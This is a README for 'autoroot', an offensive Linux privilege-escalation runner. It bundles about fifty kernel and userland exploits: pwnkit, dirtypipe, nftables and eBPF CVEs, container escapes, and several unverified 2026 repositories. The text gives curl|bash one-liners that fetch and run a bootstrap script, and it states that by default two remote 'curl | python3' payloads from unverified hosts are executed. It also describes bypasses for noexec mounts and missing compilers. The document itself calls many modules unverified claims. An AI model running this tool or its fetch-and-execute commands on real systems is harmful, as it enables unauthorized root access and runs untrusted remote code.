# autoroot

Lab privilege-escalation runner. It wraps the public exploit commands into one
script, with environment checks and per-command timeouts.

**Use only on a disposable VM you own.** Some modules are unverified public
repos; some can crash the kernel. A child exploit cannot elevate the parent
Python process: use a module that leaves a SUID shell, or run the module with
`--raw` so an interactive root shell stays attached to your terminal.

## Usage

Fastest path (works even if `python3` is missing):

```bash
curl -fsSL "https://raw.githubusercontent.com/thiscitze/autoroot/main/bootstrap.sh?v=$(date +%s)" | bash
```

With arguments:

```bash
curl -fsSL "https://raw.githubusercontent.com/thiscitze/autoroot/main/bootstrap.sh?v=$(date +%s)" | bash -s -- --raw --only dirtypipe
```

If Python 3.6+ is already installed:

```bash
python3 autoroot.py
python3 autoroot.py --list
python3 autoroot.py --only pwnkit
python3 autoroot.py --timeout 90
python3 autoroot.py --raw --only dirtypipe
python3 autoroot.py --no-untrusted
python3 autoroot.py --dry-run
```

- No flags: runs **every** module - kernel/distro checks ignored, lab modules
  included, and the two remote `curl | python3` payloads executed.
- `--list` - show modules and flags.
- `--safe` - honour kernel/distro compatibility checks.
- `--only KEY` - run one module.
- `--dry-run` - print commands without executing.
- `--verbose` - show every command and its captured output.
- `--raw` - stream exploit output live. Needed when a module spawns an
  interactive root shell; also the noisy mode.
- `--color auto|always|never` - ANSI color mode.
- `--no-untrusted` - skip the two remote payloads from unverified hosts.
- `--labs` - keep lab modules when `--safe` is used.
- `--timeout N` - per-command timeout (default 45s; 0 = no timeout).
- Requires Linux and Python 3.6+. If Python is older/missing, use
  `bootstrap.sh`.

## GCC and permission bypasses

The runner tries to keep compile/run steps working on minimal or locked-down
VMs:

- **Compiler fallback:** `gcc` -> `cc` -> `clang` -> `tcc`.
- **Package install:** if none exist, it tries `sudo -n` with apt/dnf/yum/apk/
  pacman/zypper (passwordless sudo only; no prompt).
- **Workdir selection:** `$AUTOROOT_WORK`, `~/.cache/autoroot`, `/dev/shm`,
  `/var/tmp`, `/tmp`; it skips mounts marked `noexec`.
- **noexec retry:** if a compiled binary returns 126 (permission/exec denied),
  it copies the binary to `~/.cache/autoroot-exec` or `/dev/shm/autoroot-exec`
  and retries.
- **Git/tar/curl/make:** missing tools are installed with the same
  passwordless-sudo path.

If the box has no compiler, no package manager, and no writable exec mount,
compile-based modules will skip; there is no userspace trick around that.

## Output

Default output is a colored wordmark, environment line, one status line per
module, and a sectioned summary.

```
  THISCITZE            <- 6-row ASCII wordmark, per-letter gradient
  autoroot  ·  linux privilege escalation
  ────────────────────────────────────────────────

  root@host
  Debian GNU/Linux 10  ·  kernel 4.19.0-21-amd64  ·  uid 1000

  ▌ RUN  52 MODULES  ────────────────────────────────
  ✔  recon                  recon                              0.1s
  ✘  pwnkit                 pkexec yok veya SUID degil          0.3s
  ★  dirtypipe              uid=0(root) gid=0(root) ...         1.8s

  ▌ SUMMARY  ───────────────────────────────────────
  ran 30   failed 18   skipped 0
  ▌ ROOT
  ★ dirtypipe               uid=0(root) gid=0(root) ...
  interactive: python3 autoroot.py --raw --only dirtypipe
```

- Each module gets one line: `✔` ran, `✘` failed (reason), `·` skipped,
  `★` root proof, plus elapsed time.
- While a module runs, a single-line spinner replaces the terminal line (TTY
  only), so long downloads do not scroll the screen.
- Colors use 256-color ANSI with a cyan→violet ramp; `--color auto` (default)
  only colors a TTY, `--color always|never` forces it.
- The wordmark spells `THISCITZE`; on terminals narrower than 76 columns it
  collapses to a one-line brand so nothing wraps.
- Every exploit command runs with `stdin=/dev/null`, `stdout+stderr` piped, so
  compiler noise, BPF verifier dumps, `su` usage text and `tar` warnings never
  reach the terminal. They go to the log file instead.
- Full transcript: `~/.cache/autoroot/autoroot-YYYYmmdd-HHMMSS.log` (printed
  at the end; falls back to `/dev/shm` or the system temp dir).
- `--verbose` prints each command plus its captured output under the status
  line. `--raw` gives the child process the real terminal (interactive root
  shells work, output is unfiltered).

```bash
python3 autoroot.py --color always
python3 autoroot.py --verbose
python3 autoroot.py --raw --only dirtypipe
```

## git/curl/python fallbacks

- **git missing:** `git clone` calls are transparently replaced by a
  GitHub tarball download (`main` then `master`) using curl, wget, or
  Python's `urllib`.
- **curl missing:** direct downloads use wget or `urllib`; git clones still
  work.
- **python3 missing:** run the bootstrap. It looks for a usable Python 3.6+ in
  `PATH` and in non-standard installs (RHEL `platform-python`, cPanel, Plesk,
  pyenv, conda), then tries passwordless `sudo` package install, then downloads
  a standalone static CPython 3.12 into `~/.cache/autoroot-py` (no root, no
  package manager, works on old glibc). It then runs autoroot with your args.

```bash
curl -fsSL "https://raw.githubusercontent.com/thiscitze/autoroot/main/bootstrap.sh?v=$(date +%s)" | bash
curl -fsSL "https://raw.githubusercontent.com/thiscitze/autoroot/main/bootstrap.sh?v=$(date +%s)" | bash -s -- --raw
```

If `curl` itself is missing:

```bash
wget -qO- "https://raw.githubusercontent.com/thiscitze/autoroot/main/bootstrap.sh?v=$(date +%s)" | bash
```

If `bash` is missing too, there is nothing left to bootstrap with; run
`python3 autoroot.py` from any shell that has Python 3.6+.

The standalone interpreter stays cached at
`~/.cache/autoroot-py/python/bin/python3`, so later runs can skip the download:

```bash
~/.cache/autoroot-py/python/bin/python3 autoroot.py --raw
```

## Modules

| Key | Target |
|---|---|
| `recon` | `id`, groups, `sudo -n -l`, kernel, distro |
| `suid_gtfobins` | SUID scan + GTFOBins shell |
| `sudo_nopasswd` | passwordless sudo + GTFOBins |
| `docker_group` | Docker group host escape |
| `lxd_group` | LXD group manual escape |
| `writable_passwd` | writable `/etc/passwd` or `/etc/shadow` |
| `writable_root_jobs` | writable cron/systemd/logrotate |
| `pwnkit` | pkexec SUID (CVE-2021-4034) |
| `dirtypipe` | kernel 5.8-5.16 (CVE-2022-0847) |
| `gameover` | Ubuntu OverlayFS (CVE-2023-2640/32629) |
| `overlayfs` | CVE-2023-0386 |
| `dirtyfrag` | kernel 6.1-6.6 |
| `fragnesia` | kernel 5.19-6.8 |
| `packagekit` | PackageKit (CVE-2026-41651) |
| `ovswrap` | Open vSwitch |
| `cve2026_46300` | unknown |
| `diagspill` | unknown |
| `tunderflow` | unknown |
| `cve2026_68138` | unknown |
| `dirtydecrypt` | CVE-2026-31635 |
| `cybermeowfia` | CVE-2026-52923 RHEL lab |
| `cve2026_68398` | unknown |
| `pwnkit2` | PwnKit second repo |
| `cve2026_64600` | unknown |
| `sudo_baron` | sudo Baron Samedit (CVE-2021-3156) |
| `polkit_3560` | polkit (CVE-2021-3560) |
| `looney` | Looney Tunables (CVE-2023-4911) |
| `nft_1086` | nftables (CVE-2024-1086) |
| `cve_2021_22555` | netfilter (CVE-2021-22555) |
| `cve_2021_3493` | Ubuntu overlayfs (CVE-2021-3493) |
| `cve_2022_0185` | fs_context (CVE-2022-0185) |
| `cve_2022_2588` | cls_route (CVE-2022-2588) |
| `cve_2020_8835` | eBPF (CVE-2020-8835) |
| `cve_2022_1015` | nftables (CVE-2022-1015) |
| `cve_2023_0179` | nftables (CVE-2023-0179) |
| `cve_2024_0582` | io_uring (CVE-2024-0582) |
| `cve_2023_22809` | sudoedit (CVE-2023-22809) |
| `cve_2024_48990` | needrestart (CVE-2024-48990) |
| `cve_2021_44731` | snap-confine (CVE-2021-44731) |
| `cve_2023_32233` | nftables (CVE-2023-32233) |
| `cve_2022_0995` | watch_queue (CVE-2022-0995) |
| `cve_2022_25636` | nftables (CVE-2022-25636) |
| `cve_2022_27666` | ESP (CVE-2022-27666) |
| `cve_2021_4204` | eBPF (CVE-2021-4204) |
| `cve_2022_23222` | eBPF (CVE-2022-23222) |
| `cve_2021_3490` | eBPF (CVE-2021-3490) |
| `untrusted_copyfail` | `copy.fail` remote script (untrusted) |
| `untrusted_softechnology` | `softechnology.biz` remote script (untrusted) |
| `mariadb_lab` | Docker MariaDB lab |
| `post_suid` | SUID bash, only if already root |

## Notes

- High-value manual vectors (`suid_gtfobins`, `sudo_nopasswd`, `docker_group`,
  `writable_passwd`, `writable_root_jobs`) run before kernel exploits.
- `writable_passwd` and `writable_root_jobs` are checks: they print the vector
  and example commands, but do not modify `/etc/passwd` or cron jobs.
- `lxd_group` prints the manual container sequence; it does not pull images
  or start containers automatically.
- By default every module is attempted even if the kernel/distro looks out
  of range (`--safe` restores the checks). This can panic the kernel; use a
  disposable VM.
- Kernel/distro checks are coarse; a module can still fail on a patched or
  differently configured host.
- `post_suid` is not a privilege escalation: `cp /bin/bash /tmp/bash` only
  works if the script is already root.
- The two `curl | python3` entries run by default, like every other module;
  the domains are not verified. Use `--no-untrusted` to skip them.
- Many CVE-2026 entries are unverified public repos. Treat their titles as
  claims, not facts.
- Root attribution is output-based: a module is marked `★` when its stdout
  contains a root proof line. Check the evidence line and the log before
  trusting it.
- `--raw` disables output capture, so the terminal shows everything the
  exploit prints (including `su` usage spam and kernel splats). It is the only
  mode where a spawn-a-shell exploit can hand you an interactive root prompt.
- The runner writes its workdir under `~/.cache/autoroot`, `/dev/shm` or
  `/tmp`; the transcript goes to `~/.cache/autoroot/autoroot-*.log`. Remove
  both when done.

## Suggested lab flow

```bash
# 1. snapshot the VM
python3 autoroot.py --list
python3 autoroot.py --yes --only pwnkit
python3 autoroot.py --yes --only dirtypipe
# 2. inspect results, then try the rest
python3 autoroot.py --yes --timeout 60
```
